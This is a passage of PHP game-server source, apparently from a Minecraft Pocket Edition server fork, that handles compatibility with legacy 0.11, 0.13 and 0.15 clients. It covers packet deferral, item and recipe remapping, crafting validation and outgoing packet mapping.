		if($currentTick > $this->legacy011StatusTipUntilTick){
			return;
		}

		$this->sendTip(ProtocolCompatibility::formatLegacy011StatusTip($this->getFood(), (int) $this->getExpLevel(), $this->getLegacy011ExperienceProgress()));
	}

	private function sendLegacy011ExperienceStatusTipNow() : void{
		if(!$this->isProtocol011Player() or !$this->spawned or !$this->isAlive()){
			return;
		}

		$currentTick = $this->server->getTick();
		$this->legacy011StatusTipUntilTick = max($this->legacy011StatusTipUntilTick, $currentTick + (20 * 2));
		$this->legacy011StatusTipNextTick = $currentTick + (20 * 10);
		$this->sendTip(ProtocolCompatibility::formatLegacy011StatusTip($this->getFood(), (int) $this->getExpLevel(), $this->getLegacy011ExperienceProgress()));
	}

	private function sendProtocol011HeldEnchantmentsMessage(Item $item) : void{
		if(!$this->isProtocol011Player() or !$this->spawned or !$this->isAlive()){
			return;
		}

		$message = ProtocolCompatibility::formatLegacy011ItemDetailsMessage($item);
		if($message === null){
			$this->legacy011LastItemDetailsMessage = "";
			return;
		}

		if($message === $this->legacy011LastItemDetailsMessage){
			return;
		}

		$this->legacy011LastItemDetailsMessage = $message;
		$this->sendMessage($message);
	}

	private function isTrackableConsumeItem(Item $item){
		if($item->getId() === Item::BUCKET){
			return $item->getDamage() === 1;
		}

		static $consumeItems = [
			Item::APPLE => true,
			Item::MUSHROOM_STEW => true,
			Item::RABBIT_STEW => true,
			Item::BEETROOT_SOUP => true,
			Item::BREAD => true,
			Item::RAW_PORKCHOP => true,
			Item::COOKED_PORKCHOP => true,
			Item::RAW_MUTTON => true,
			Item::COOKED_MUTTON => true,
			Item::RAW_BEEF => true,
			Item::BEETROOT => true,
			Item::STEAK => true,
			Item::COOKED_CHICKEN => true,
			Item::RAW_CHICKEN => true,
			Item::MELON_SLICE => true,
			Item::GOLDEN_APPLE => true,
			Item::ENCHANTED_GOLDEN_APPLE => true,
			Item::PUMPKIN_PIE => true,
			Item::CARROT => true,
			Item::POTATO => true,
			Item::POISONOUS_POTATO => true,
			Item::BAKED_POTATO => true,
			Item::COOKIE => true,
			Item::RAW_SALMON => true,
			Item::CLOWN_FISH => true,
			Item::GOLDEN_CARROT => true,
			Item::PUFFER_FISH => true,
			Item::RAW_RABBIT => true,
			Item::COOKED_RABBIT => true,
			Item::COOKED_SALMON => true,
			Item::COOKED_FISH => true,
			Item::RAW_FISH => true,
			Item::POTION => true,
			Item::ROTTEN_FLESH => true,
			Item::SPIDER_EYE => true
		];

		return isset($consumeItems[$item->getId()]);
	}

	private function shouldLegacy011UseDirectFoodConsume(Item $item) : bool{
		if(!$this->isProtocol011Player() or !$this->server->foodEnabled or !$this->foodEnabled or !$this->spawned or !$this->isAlive()){
			return false;
		}

		return $this->getFood() < 20 and $this->isTrackableConsumeItem($item);
	}

	private function consumeProtocol011FoodInHand(Item $item) : bool{
		if(!$this->shouldLegacy011UseDirectFoodConsume($item)){
			return false;
		}

		$slot = $this->inventory->getItemInHand();
		if(!$this->shouldLegacy011UseDirectFoodConsume($slot)){
			$this->inventory->sendHeldItem($this);
			return false;
		}

		$this->eatFoodInHand();
		$this->inventory->sendContents($this);
		$this->inventory->sendHeldItem($this);
		$this->lastEat = PHP_INT_MAX;
		return true;
	}

	private function sendProtocol015LeashStateReset() : void{
		if(!ProtocolCompatibility::isProtocol015((int) $this->getProtocol())){
			return;
		}

		$pk = new SetEntityDataPacket();
		$pk->eid = 0;
		$pk->metadata = [
			self::DATA_LEAD_HOLDER => [self::DATA_TYPE_LONG, -1],
		];
		$this->dataPacket($pk);
	}

	private function isMinimalProtocol015BootstrapPacket($packet) : bool{
		if(!$packet instanceof DataPacketV84){
			return false;
		}

		if($packet::NETWORK_ID === InfoV84::BATCH_PACKET){
			return $this->isMinimalProtocol015BootstrapBatch($packet);
		}

		return $this->isMinimalProtocol015BootstrapPacketId($packet::NETWORK_ID);
	}

	private function isMinimalProtocol015BootstrapPacketId(int $packetId) : bool{
		return in_array($packetId, [
			InfoV84::PLAY_STATUS_PACKET,
			InfoV84::DISCONNECT_PACKET,
			InfoV84::SET_TIME_PACKET,
			InfoV84::START_GAME_PACKET,
			InfoV84::SET_HEALTH_PACKET,
			InfoV84::SET_SPAWN_POSITION_PACKET,
			InfoV84::FULL_CHUNK_DATA_PACKET,
			InfoV84::SET_DIFFICULTY_PACKET,
		], true);
	}

	private function isMinimalProtocol015BootstrapBatch(DataPacketV84 $packet) : bool{
		if(!property_exists($packet, "payload") or !is_string($packet->payload) or $packet->payload === ""){
			return false;
		}

		$str = @zlib_decode($packet->payload, 1024 * 1024 * 64);
		if(!is_string($str)){
			return false;
		}

		$len = strlen($str);
		$offset = 0;
		$seenPacket = false;
		while($offset < $len){
			if($offset + 4 > $len){
				return false;
			}

			$packetLength = \lycore\utils\Binary::readInt(substr($str, $offset, 4));
			$offset += 4;
			if($packetLength <= 0 or $offset + $packetLength > $len){
				return false;
			}

			$buffer = substr($str, $offset, $packetLength);
			$offset += $packetLength;
			$header = ProtocolCompatibility::readPacketHeader($buffer);
			if($header === null){
				return false;
			}

			[$packetId] = $header;
			if($packetId === InfoV84::BATCH_PACKET or !$this->isMinimalProtocol015BootstrapPacketId((int) $packetId)){
				return false;
			}

			$seenPacket = true;
		}

		return $seenPacket;
	}

	private function shouldDeferV84Packet($packet) : bool{
		return $packet instanceof DataPacketV84
			&& !$this->v84WorldReady
			&& $this->isProtocol015Player()
			&& (bool) $this->getProtocol015Property("protocol-v84.defer-nonessential", true)
			&& !$this->isMinimalProtocol015BootstrapPacket($packet);
	}

	private function deferV84Packet(DataPacketV84 $packet) : bool{
		if(count($this->v84DeferredPackets) >= max(32, (int) $this->getProtocol015Property("protocol-v84.defer-limit", 256))){
			return true;
		}

		$this->v84DeferredPackets[] = clone $packet;

		return true;
	}

	public function shouldHoldV84BlockEntities() : bool{
		return $this->isProtocol015Player()
			&& !$this->v84WorldReady
			&& (bool) $this->getProtocol015Property("protocol-v84.defer-block-entities", true);
	}

	public function markV84WorldReady(string $source) : void{
		if(!$this->isProtocol015Player() || $this->v84WorldReady){
			return;
		}

		$this->v84WorldReady = true;
		$deferred = $this->v84DeferredPackets;
		$this->v84DeferredPackets = [];

		if($this->level instanceof Level && is_array($this->usedChunks)){
			foreach($this->usedChunks as $index => $_){
				Level::getXZ($index, $chunkX, $chunkZ);
				foreach($this->level->getChunkTiles($chunkX, $chunkZ) as $tile){
					if($tile instanceof Spawnable){
						$tile->spawnTo($this);
					}
				}
			}
		}

		foreach($deferred as $packet){
			$this->dataPacket($packet);
		}

		$this->sendProtocol015LeashStateReset();
	}

	private function resetProtocol015WorldReadyState() : void{
		$this->v84WorldReady = false;
		$this->v84DeferredPackets = [];
	}

	private function isProtocol013Player(){
		return ProtocolCompatibility::isProtocol013((int) $this->protocol);
	}

	private function sanitizeProtocol013Item(Item $item){
		return ProtocolCompatibility::mapItemForProtocol((int) $this->protocol, $item, false);
	}

	private function sanitizeProtocol013ContainerItem(Item $item){
		return ProtocolCompatibility::mapItemForProtocol((int) $this->protocol, $item, true);
	}

	private function isProtocol013NormalContainerWindow($windowId) : bool{
		return $windowId !== ContainerSetContentPacket::SPECIAL_INVENTORY and
			$windowId !== ContainerSetContentPacket::SPECIAL_ARMOR and
			$windowId !== ContainerSetContentPacket::SPECIAL_CREATIVE;
	}

	private function isProtocol013HiddenItem(Item $item) : bool{
		$meta = $item->getDamage();
		return ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $item->getId(), $meta === null ? 0 : (int) $meta);
	}

	private function isProtocol013BlockedHiddenContainerPlaceholder(Item $sourceItem, Item $targetItem) : bool{
		if(microtime(true) > $this->protocol013HiddenContainerPlaceholderBlockUntil){
			return false;
		}

		return $sourceItem->getId() === Item::AIR and $targetItem->getId() === Item::STONE and ((int) $targetItem->getDamage()) === 0;
	}

	private function rejectProtocol013HiddenContainerChange(Inventory $inventory, int $slot){
		$this->currentTransaction = null;
		$this->protocol013HiddenContainerPlaceholderBlockUntil = microtime(true) + 1.0;
		$inventory->sendSlot($slot, $this);
		$this->inventory->sendContents($this);
	}

	private function sanitizeProtocol013RecipeItem(Item $item, bool &$modified){
		$mappedItem = ProtocolCompatibility::mapRecipeItemForProtocol((int) $this->protocol, $item);
		if($mappedItem === null){
			return null;
		}

		if(!$mappedItem->deepEquals($item, true, true, true)){
			$modified = true;
		}

		return $mappedItem;
	}

	private function cloneProtocol013RecipeWithId($recipe, bool &$modified){
		$modified = false;

		if($recipe instanceof ShapedRecipe){
			$result = $this->sanitizeProtocol013RecipeItem($recipe->getResult(), $modified);
			if($result === null){
				return null;
			}

			$mappedRecipe = new ShapedRecipeFromJson($result, $recipe->getHeight(), $recipe->getWidth());
			for($y = 0; $y < $recipe->getHeight(); ++$y){
				for($x = 0; $x < $recipe->getWidth(); ++$x){
					$ingredient = $recipe->getIngredient($x, $y);
					if($ingredient instanceof Item){
						$mappedIngredient = $this->sanitizeProtocol013RecipeItem($ingredient, $modified);
						if($mappedIngredient === null){
							return null;
						}
						$mappedRecipe->addIngredient($x, $y, $mappedIngredient);
					}
				}
			}
		}elseif($recipe instanceof ShapelessRecipe){
			$result = $this->sanitizeProtocol013RecipeItem($recipe->getResult(), $modified);
			if($result === null){
				return null;
			}

			$mappedRecipe = $recipe instanceof BigShapelessRecipe ? new BigShapelessRecipe($result) : new ShapelessRecipe($result);
			foreach($recipe->getIngredientList() as $ingredient){
				$mappedIngredient = $this->sanitizeProtocol013RecipeItem($ingredient, $modified);
				if($mappedIngredient === null){
					return null;
				}
				$mappedRecipe->addIngredient($mappedIngredient);
			}
		}elseif($recipe instanceof FurnaceRecipe){
			$result = $this->sanitizeProtocol013RecipeItem($recipe->getResult(), $modified);
			$input = $this->sanitizeProtocol013RecipeItem($recipe->getInput(), $modified);
			if($result === null or $input === null){
				return null;
			}

			$mappedRecipe = new FurnaceRecipe($result, $input);
		}else{
			return $recipe;
		}

		if($recipe->getId() !== null){
			$mappedRecipe->setId($recipe->getId());
		}

		return $modified ? $mappedRecipe : $recipe;
	}

	private function protocol013ClientItemMatches(Item $serverItem, Item $clientItem){
		if($clientItem->getId() === Item::AIR){
			return false;
		}

		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			$normalized = ProtocolCompatibility::normalizeClientItemForProtocol((int) $this->protocol, $clientItem);
			if($normalized !== $clientItem){
				$normalized->setCount($clientItem->getCount());
				return $serverItem->deepEquals($normalized, true, true, true);
			}
		}

		$serverMeta = $serverItem->getDamage();
		$clientMeta = $clientItem->getDamage();
		return ProtocolCompatibility::itemsMatchAfterProtocolMapping(
			(int) $this->protocol,
			$serverItem->getId(),
			$serverMeta === null ? 0 : (int) $serverMeta,
			$serverItem->getCount(),
			$clientItem->getId(),
			$clientMeta === null ? 0 : (int) $clientMeta,
			$clientItem->getCount()
		);
	}

	private function protocol013ClientHeldItemMatches(Item $serverItem, Item $clientItem){
		if($this->protocol013ClientItemMatches($serverItem, $clientItem)){
			return true;
		}

		if($clientItem->getId() !== Item::AIR or $serverItem->getCount() <= 0){
			return false;
		}

		$serverMeta = $serverItem->getDamage();
		return ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $serverItem->getId(), $serverMeta === null ? 0 : (int) $serverMeta);
	}

	private function normalizeProtocol013ClientItem(Item $sourceItem, Item $clientItem){
		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			$normalized = ProtocolCompatibility::normalizeRecipeClientItemForProtocol((int) $this->protocol, $sourceItem, $clientItem);
			if($normalized !== $clientItem){
				$normalized->setCount($clientItem->getCount());
				return $normalized;
			}
		}

		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->protocol013ClientItemMatches($sourceItem, $clientItem)){
			$item = clone $sourceItem;
			$item->setCount($clientItem->getCount());
			return $item;
		}

		return $clientItem;
	}

	private function normalizeProtocol013RecipeInput($recipe, int $index, Item $clientItem){
		if($recipe instanceof ShapedRecipe){
			$ingredient = $recipe->getIngredient($index % 3, intdiv($index, 3));
			if($ingredient instanceof Item){
				return $this->normalizeProtocol013ClientItem($ingredient, $clientItem);
			}
		}elseif($recipe instanceof ShapelessRecipe){
			foreach($recipe->getIngredientList() as $ingredient){
				if($ingredient instanceof Item and $this->protocol013ClientItemMatches($ingredient, $clientItem)){
					return $this->normalizeProtocol013ClientItem($ingredient, $clientItem);
				}
			}
		}

		return $clientItem;
	}

	private function findProtocol013MatchingInventorySlot(Item $clientItem){
		if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			foreach($this->inventory->getContents() as $slot => $inventoryItem){
				if($inventoryItem instanceof Item and $this->protocol013ClientItemMatches($inventoryItem, $clientItem)){
					return $slot;
				}
			}
		}

		return $this->inventory->first($clientItem);
	}

	private function isProtocol013RecipeItemSafe(Item $item){
		if(ProtocolCompatibility::hasLegacyItemSurrogateForProtocol((int) $this->protocol, $item)){
			return true;
		}

		$mappedItem = ProtocolCompatibility::mapItemForProtocol((int) $this->protocol, $item, false);
		$meta = $mappedItem->getDamage();
		return !ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $mappedItem->getId(), $meta === null ? 0 : (int) $meta);
	}

	private function isProtocol013RecipeSafe($recipe){
		if($recipe instanceof ShapedRecipe){
			if(!$this->isProtocol013RecipeItemSafe($recipe->getResult())){
				return false;
			}
			foreach($recipe->getIngredientMap() as $row){
				foreach($row as $item){
					if($item instanceof Item and !$this->isProtocol013RecipeItemSafe($item)){
						return false;
					}
				}
			}
		}elseif($recipe instanceof ShapelessRecipe){
			if(!$this->isProtocol013RecipeItemSafe($recipe->getResult())){
				return false;
			}
			foreach($recipe->getIngredientList() as $item){
				if($item instanceof Item and !$this->isProtocol013RecipeItemSafe($item)){
					return false;
				}
			}
		}elseif($recipe instanceof \lycore\inventory\FurnaceRecipe){
			return $this->isProtocol013RecipeItemSafe($recipe->getInput()) and $this->isProtocol013RecipeItemSafe($recipe->getResult());
		}

		return true;
	}

	private function getRecipeInputSlots($recipe) : array{
		$input = array_fill(0, 9, Item::get(Item::AIR, 0, 0));
		if($recipe instanceof ShapedRecipe){
			foreach($recipe->getIngredientMap() as $y => $row){
				foreach($row as $x => $item){
					if($item instanceof Item and $item->getId() !== Item::AIR and $item->getCount() > 0){
						$slot = ((int) $y * 3) + (int) $x;
						if(isset($input[$slot])){
							$input[$slot] = clone $item;
							$input[$slot]->setCount(1);
						}
					}
				}
			}
			return $input;
		}

		if($recipe instanceof ShapelessRecipe){
			$slot = 0;
			foreach($recipe->getIngredientList() as $item){
				if(!($item instanceof Item) or $item->getId() === Item::AIR or $item->getCount() <= 0){
					continue;
				}
				for($i = 0; $i < $item->getCount() and $slot < 9; ++$i){
					$input[$slot] = clone $item;
					$input[$slot]->setCount(1);
					++$slot;
				}
			}
			return $input;
		}

		return [];
	}

	private function canProvideCraftingIngredientsFromInventory(array $ingredients) : bool{
		$used = array_fill(0, $this->inventory->getSize(), 0);
		foreach($ingredients as $ingredient){
			if(!($ingredient instanceof Item) or $ingredient->getId() === Item::AIR or $ingredient->getCount() <= 0){
				continue;
			}

			$remaining = $ingredient->getCount();
			foreach($this->inventory->getContents() as $index => $item){
				if(!($item instanceof Item) or $item->getId() === Item::AIR){
					continue;
				}

				if($ingredient->deepEquals($item, $ingredient->getDamage() !== null, $ingredient->getCompoundTag() !== null)){
					$available = $item->getCount() - $used[$index];
					if($available <= 0){
						continue;
					}

					$take = min($remaining, $available);
					$used[$index] += $take;
					$remaining -= $take;
					if($remaining <= 0){
						break;
					}
				}
			}

			if($remaining > 0){
				return false;
			}
		}

		return true;
	}

	private function normalizeProtocol011CraftingItem(Item $item, bool $ingredient) : Item{
		$item = clone $item;
		if($item->getDamage() === -1 or $item->getDamage() === 0xffff){
			$item->setDamage(null);
		}

		if($ingredient and $item->getId() !== Item::AIR and $item->getCount() > 0){
			$item->setCount(1);
		}

		return $item;
	}

	private function isEmptyProtocol011CraftingItem(Item $item) : bool{
		return $item->getId() === Item::AIR or $item->getCount() <= 0;
	}

	private function isProtocol011CraftingItemVisible(Item $item) : bool{
		if($this->isEmptyProtocol011CraftingItem($item)){
			return true;
		}

		$meta = $item->getDamage();
		return !ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $item->getId(), $meta === null ? 0 : (int) $meta);
	}

	private function protocol011CraftingItemMatches(Item $serverItem, Item $clientItem) : bool{
		if($this->isEmptyProtocol011CraftingItem($serverItem) or $this->isEmptyProtocol011CraftingItem($clientItem)){
			return $this->isEmptyProtocol011CraftingItem($serverItem) and $this->isEmptyProtocol011CraftingItem($clientItem);
		}

		if($serverItem->deepEquals($clientItem, $serverItem->getDamage() !== null, $serverItem->getCompoundTag() !== null)){
			return true;
		}

		return ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->protocol013ClientItemMatches($serverItem, $clientItem);
	}

	private function getProtocol011CraftingGridItem(array $grid, int $x, int $y, bool $columnMajor) : Item{
		return $grid[$columnMajor ? ($x * 3 + $y) : ($y * 3 + $x)];
	}

	private function matchProtocol011ShapedCraftingRecipe(ShapedRecipe $recipe, array $grid, array &$ingredients, bool $columnMajor = false) : bool{
		$minX = 3;
		$minY = 3;
		$maxX = -1;
		$maxY = -1;
		for($y = 0; $y < 3; ++$y){
			for($x = 0; $x < 3; ++$x){
				$item = $this->getProtocol011CraftingGridItem($grid, $x, $y, $columnMajor);
				if(!$this->isEmptyProtocol011CraftingItem($item)){
					$minX = min($minX, $x);
					$minY = min($minY, $y);
					$maxX = max($maxX, $x);
					$maxY = max($maxY, $y);
				}
			}
		}

		if($maxX < $minX or $maxY < $minY){
			return false;
		}

		$width = $maxX - $minX + 1;
		$height = $maxY - $minY + 1;
		if($width !== $recipe->getWidth() or $height !== $recipe->getHeight()){
			return false;
		}

		$ingredients = [];
		for($y = 0; $y < $height; ++$y){
			for($x = 0; $x < $width; ++$x){
				$clientItem = $this->getProtocol011CraftingGridItem($grid, $minX + $x, $minY + $y, $columnMajor);
				$ingredient = $recipe->getIngredient($x, $y);
				if($ingredient instanceof Item and !$this->isEmptyProtocol011CraftingItem($ingredient)){
					if(!$this->protocol011CraftingItemMatches($ingredient, $clientItem)){
						return false;
					}

					$normalized = $this->normalizeProtocol013ClientItem($ingredient, $clientItem);
					$normalized->setCount(1);
					$ingredients[] = $normalized;
				}elseif(!$this->isEmptyProtocol011CraftingItem($clientItem)){
					return false;
				}
			}
		}

		return true;
	}

	private function matchProtocol011ShapelessCraftingRecipe(ShapelessRecipe $recipe, array $grid, array &$ingredients) : bool{
		$needed = $recipe->getIngredientList();
		$ingredients = [];

		foreach($grid as $clientItem){
			if($this->isEmptyProtocol011CraftingItem($clientItem)){
				continue;
			}

			$matched = false;
			foreach($needed as $index => $neededItem){
				if($this->protocol011CraftingItemMatches($neededItem, $clientItem)){
					$normalized = $this->normalizeProtocol013ClientItem($neededItem, $clientItem);
					$normalized->setCount(1);
					$ingredients[] = $normalized;
					$neededItem->setCount($neededItem->getCount() - 1);
					if($neededItem->getCount() <= 0){
						unset($needed[$index]);
					}
					$matched = true;
					break;
				}
			}

			if(!$matched){
				return false;
			}
		}

		return count($needed) === 0;
	}

	private function getProtocol011PackedShapedIngredientKey(Item $item) : string{
		$meta = $item->getDamage();
		return $item->getId() . ":" . ($meta === null ? "?" : (string) $meta) . ":" . (string) $item->getCompoundTag();
	}

	private function getProtocol011PackedShapedIngredients(ShapedRecipe $recipe) : array{
		$groups = [];

		for($y = 0; $y < $recipe->getHeight(); ++$y){
			for($x = 0; $x < $recipe->getWidth(); ++$x){
				$ingredient = $recipe->getIngredient($x, $y);
				if(!($ingredient instanceof Item) or $this->isEmptyProtocol011CraftingItem($ingredient)){
					continue;
				}

				$key = $this->getProtocol011PackedShapedIngredientKey($ingredient);
				if(!isset($groups[$key])){
					$groups[$key] = [
						"item" => clone $ingredient,
						"cells" => 0,
						"declared" => 0,
					];
				}

				++$groups[$key]["cells"];
				$groups[$key]["declared"] = max($groups[$key]["declared"], (int) $ingredient->getCount());
			}
		}

		$ingredients = [];
		foreach($groups as $group){
			$count = max($group["cells"], $group["declared"], 1);
			for($i = 0; $i < $count; ++$i){
				$item = clone $group["item"];
				$item->setCount(1);
				$ingredients[] = $item;
			}
		}

		return $ingredients;
	}

	private function matchProtocol011PackedShapedCraftingRecipe(ShapedRecipe $recipe, array $grid, array &$ingredients) : bool{
		$needed = $this->getProtocol011PackedShapedIngredients($recipe);
		$ingredients = [];

		foreach($grid as $clientItem){
			if($this->isEmptyProtocol011CraftingItem($clientItem)){
				continue;
			}

			$matched = false;
			foreach($needed as $index => $neededItem){
				if($this->protocol011CraftingItemMatches($neededItem, $clientItem)){
					$normalized = $this->normalizeProtocol013ClientItem($neededItem, $clientItem);
					$normalized->setCount(1);
					$ingredients[] = $normalized;
					unset($needed[$index]);
					$matched = true;
					break;
				}
			}

			if(!$matched){
				return false;
			}
		}

		return count($needed) === 0;
	}

	private function findProtocol011CraftingRecipe(array $grid, Item $result){
		foreach($this->server->getCraftingManager()->getRecipes() as $recipe){
			if(!($recipe instanceof ShapedRecipe) and !($recipe instanceof ShapelessRecipe)){
				continue;
			}

			if(($recipe instanceof BigShapedRecipe or $recipe instanceof BigShapelessRecipe) and $this->getProtocol011CraftingType() === 0){
				continue;
			}

			if(!$this->isProtocol013RecipeSafe($recipe) or !$this->protocol011CraftingItemMatches($recipe->getResult(), $result)){
				continue;
			}

			$ingredients = [];
			if($recipe instanceof ShapedRecipe){
				if($this->matchProtocol011ShapedCraftingRecipe($recipe, $grid, $ingredients)){
					return [$recipe, $ingredients];
				}

				if($this->matchProtocol011ShapedCraftingRecipe($recipe, $grid, $ingredients, true)){
					return [$recipe, $ingredients];
				}

				if($this->matchProtocol011PackedShapedCraftingRecipe($recipe, $grid, $ingredients)){
					return [$recipe, $ingredients];
				}
			}

			if($recipe instanceof ShapelessRecipe and $this->matchProtocol011ShapelessCraftingRecipe($recipe, $grid, $ingredients)){
				return [$recipe, $ingredients];
			}
		}

		return null;
	}

	private function normalizeProtocol011CraftingSlots(array $slots){
		if(count($slots) >= 10){
			return array_slice(array_values($slots), 0, 10);
		}

		if(count($slots) === 5){
			$slots = array_pad($slots, 10, Item::get(Item::AIR, 0, 0));
			$slots[9] = $slots[4];
			$slots[4] = $slots[3];
			$slots[3] = $slots[2];
			$slots[2] = Item::get(Item::AIR, 0, 0);
			$slots[5] = Item::get(Item::AIR, 0, 0);
			$slots[6] = Item::get(Item::AIR, 0, 0);
			$slots[7] = Item::get(Item::AIR, 0, 0);
			$slots[8] = Item::get(Item::AIR, 0, 0);
			return $slots;
		}

		return null;
	}

	private function awardCraftingResultAchievements(Item $result) : void{
		switch($result->getId()){
			case Item::WORKBENCH:
				$this->awardAchievement("buildWorkBench");
				break;
			case Item::WOODEN_PICKAXE:
				$this->awardAchievement("buildPickaxe");
				break;
			case Item::FURNACE:
				$this->awardAchievement("buildFurnace");
				break;
			case Item::WOODEN_HOE:
				$this->awardAchievement("buildHoe");
				break;
			case Item::BREAD:
				$this->awardAchievement("makeBread");
				break;
			case Item::CAKE:
				$this->awardAchievement("bakeCake");
				$this->inventory->addItem(Item::get(Item::BUCKET, 0, 3));
				break;
			case Item::STONE_PICKAXE:
			case Item::GOLD_PICKAXE:
			case Item::IRON_PICKAXE:
			case Item::DIAMOND_PICKAXE:
				$this->awardAchievement("buildBetterPickaxe");
				break;
			case Item::WOODEN_SWORD:
				$this->awardAchievement("buildSword");
				break;
			case Item::DIAMOND:
				$this->awardAchievement("diamond");
				break;
		}
	}

	private function handleProtocol011CraftingContentPacket(ContainerSetContentPacket $packet) : bool{
		if(!$this->isProtocol011Player() or $packet->windowid !== ContainerSetContentPacket::SPECIAL_CRAFTING){
			return false;
		}

		if($this->spawned === false or !$this->isAlive()){
			return true;
		}

		$slots = $this->normalizeProtocol011CraftingSlots($packet->slots);
		if($slots === null or !isset($slots[9]) or !($slots[9] instanceof Item)){
			$this->inventory->sendContents($this);
			return true;
		}

		$grid = [];
		for($i = 0; $i < 9; ++$i){
			if(!isset($slots[$i]) or !($slots[$i] instanceof Item)){
				$this->inventory->sendContents($this);
				return true;
			}

			$grid[$i] = $this->normalizeProtocol011CraftingItem($slots[$i], true);
			if(!$this->isProtocol011CraftingItemVisible($grid[$i])){
				$this->inventory->sendContents($this);
				return true;
			}
		}

		$result = $this->normalizeProtocol011CraftingItem($slots[9], false);
		if($this->isEmptyProtocol011CraftingItem($result) or !$this->isProtocol011CraftingItemVisible($result)){
			$this->inventory->sendContents($this);
			return true;
		}

		$match = $this->findProtocol011CraftingRecipe($grid, $result);
		if($match === null){
			$this->server->getLogger()->debug("Unmatched 0.11 crafting recipe from player " . $this->getName() . ": " . $result . ", using: " . implode(", ", $grid));
			$this->inventory->sendContents($this);
			return true;
		}

		[$recipe, $ingredients] = $match;
		$used = array_fill(0, $this->inventory->getSize(), 0);
		$canCraft = true;

		foreach($ingredients as $ingredient){
			$slot = -1;
			foreach($this->inventory->getContents() as $index => $item){
				if($ingredient->getId() !== Item::AIR and $ingredient->deepEquals($item, $ingredient->getDamage() !== null, $ingredient->getCompoundTag() !== null) and ($item->getCount() - $used[$index]) >= 1){
					$slot = $index;
					++$used[$index];
					break;
				}
			}

			if($ingredient->getId() !== Item::AIR and $slot === -1){
				$canCraft = false;
				break;
			}
		}

		if(!$canCraft){
			$this->server->getLogger()->debug("0.11 crafting recipe from player " . $this->getName() . " failed inventory validation, using: " . implode(", ", $ingredients));
			$this->inventory->sendContents($this);
			return true;
		}

		$this->server->getPluginManager()->callEvent($ev = new CraftItemEvent($this, $ingredients, $recipe));
		if($ev->isCancelled()){
			$this->inventory->sendContents($this);
			return true;
		}

		foreach($used as $slot => $count){
			if($count === 0){
				continue;
			}

			$item = $this->inventory->getItem($slot);
			if($item->getCount() > $count){
				$newItem = clone $item;
				$newItem->setCount($item->getCount() - $count);
			}else{
				$newItem = Item::get(Item::AIR, 0, 0);
			}

			$this->inventory->setItem($slot, $newItem);
		}

		$recipeResult = $recipe->getResult();
		$extraItem = $this->inventory->addItem($recipeResult);
		if(count($extraItem) > 0){
			foreach($extraItem as $item){
				$this->level->dropItem($this, $item);
			}
		}

		$this->awardCraftingResultAchievements($recipeResult);
		$this->inventory->sendContents($this);
		$this->inventory->sendHeldItem($this);
		return true;
	}

	private function findWin10DesktopCraftingRecipe($packet){
		if(count($packet->input) !== 0 or !isset($packet->output[0]) or !($packet->output[0] instanceof Item)){
			return null;
		}

		$possibleRecipes = $this->server->getCraftingManager()->getRecipesByResult($packet->output[0]);
		foreach($possibleRecipes as $possibleRecipe){
			if(($possibleRecipe instanceof BigShapelessRecipe or $possibleRecipe instanceof BigShapedRecipe) and $this->getProtocol011CraftingType() === 0){
				continue;
			}
			if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and !$this->isProtocol013RecipeSafe($possibleRecipe)){
				continue;
			}

			$input = $this->getRecipeInputSlots($possibleRecipe);
			if($this->canProvideCraftingIngredientsFromInventory($input)){
				return [$possibleRecipe, $input];
			}
		}

		return null;
	}

	private function resetProtocol013RemappedPacket(DataPacket $packet){
		$packet->buffer = null;
		$packet->isEncoded = false;
		$packet->offset = 0;
		$packet->clearEncapsulatedPacketCache();

		return $packet;
	}

	public function prepareProtocol013OutgoingPacket(DataPacket $packet){
		if(!ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol)){
			return $packet;
		}

		$mappedPacket = $packet;
		$modified = false;
		if(!isset($packet->protocol) or (int) $packet->protocol !== (int) $this->protocol){
			$mappedPacket = clone $packet;
			$mappedPacket->protocol = (int) $this->protocol;
			$modified = true;
		}

		if($mappedPacket instanceof AddEntityPacket){
			$originalEntityType = (int) $mappedPacket->type;
			if(isset($mappedPacket->metadata) and is_array($mappedPacket->metadata)){
				$metadata = ProtocolCompatibility::applyLegacyMappedEntityNameForProtocol((int) $this->protocol, $originalEntityType, $mappedPacket->metadata);
				if($metadata !== $mappedPacket->metadata){
					$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
					$mappedPacket->metadata = $metadata;
					$modified = true;
				}
			}

			$entityType = ProtocolCompatibility::mapEntityTypeForProtocol((int) $this->protocol, $originalEntityType);
			if($entityType !== (int) $mappedPacket->type){
				$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
				$mappedPacket->type = $entityType;
				$modified = true;
			}
		}

		if($mappedPacket instanceof \lycore\network\protocol\LevelEventPacket){
			$data = ProtocolCompatibility::mapLevelEventDataForProtocol((int) $this->protocol, (int) $mappedPacket->evid, (int) $mappedPacket->data);
			if($data !== (int) $mappedPacket->data){
				$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
				$mappedPacket->data = $data;
				$modified = true;
			}
		}

		if($mappedPacket instanceof UpdateBlockPacket){
			$records = [];
			foreach($mappedPacket->records as $record){
				if(isset($record[3], $record[4])){
					[$record[3], $record[4]] = ProtocolCompatibility::mapBlockForProtocol((int) $this->protocol, (int) $record[3], (int) $record[4]);
				}
				$records[] = $record;
			}
			$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
			$mappedPacket->records = $records;
			$modified = true;
		}

		if($mappedPacket instanceof FullChunkDataPacket and is_string($mappedPacket->data)){
			$mappedData = ProtocolCompatibility::remapChunkPayloadForProtocol((int) $this->protocol, $mappedPacket->data);
			if($mappedData !== $mappedPacket->data){
				$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
				$mappedPacket->data = $mappedData;
				$modified = true;
			}
		}

		if($mappedPacket instanceof BatchPacket and is_string($mappedPacket->payload) and empty($mappedPacket->protocolMapped)){
